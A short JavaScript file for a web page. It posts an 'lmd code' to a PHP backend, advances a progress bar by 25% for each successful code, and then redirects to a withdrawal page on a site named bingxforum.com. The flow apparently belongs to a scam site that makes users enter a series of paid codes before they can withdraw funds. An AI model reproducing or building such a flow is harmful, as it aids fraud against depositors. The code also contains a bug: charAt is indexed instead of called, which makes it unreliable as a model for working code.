
var contain = document.getElementById("bar");
var lmdcode = document.getElementById("lmdcode");





var width = contain.textContent;
var store = "";
for (let index = 0; index < width.length; index++) {
	if (width.charAt[index] != "%") {
		store += width[index];
	}
}

width = parseInt(store);
console.log(width);


contain.style.width = width + "%";
if (width == 100) {
	contain.style.backgroundColor = "#04aa6d";
}

const form = document.querySelector(".contact-form form"),
	goBtn = form.querySelector("#goBtn");

form.onsubmit = (e) => {
	e.preventDefault();
};

goBtn.onclick = () => {
	let xhr = new XMLHttpRequest();

	xhr.open("POST", "include/pin.php", true);

	xhr.onload = () => {
		if (xhr.readyState === XMLHttpRequest.DONE) {

			if (xhr.status === 200) {
				let data = xhr.response;
				console.log(data);

				//if the lmd code is valid and the message receive from php file is "successful"
				if (data == "Successful") {
					
					if (width <= 75) {

						var elem = document.getElementById("bar");
						width += 25;
						elem.style.width = width + "%";
						elem.innerHTML = width + "%";

						if (width == "100") {
							elem.style.backgroundColor = "#04aa6d";
							//document.getElementById("input-key").style.display = "none";
							
						}

						var msg = document.getElementById("success");
						msg.innerHTML = data;
						msg.style.display = "block";

						let redirect_Page = () => {

							var msg = document.getElementById("success");
							msg.innerHTML = data;
							msg.style.display = "block";

							let tID = setTimeout(function () {
								//Redirecting to another page...
								location.href = "https://bingxforum.com/wasabi/user/withdraw.php";
								window.clearTimeout(tID); // clear time out.
								
								document.getElementById("input-key").value = "";
								document.getElementById("input-key").style.display = "none";
								msg.style.display = "none"
							}, 500);
						};
						redirect_Page();
					}
				} else {
					console.log(data);
				}
				
			}
		}
	};
	let formData = new FormData(form);
	xhr.send(formData);
};
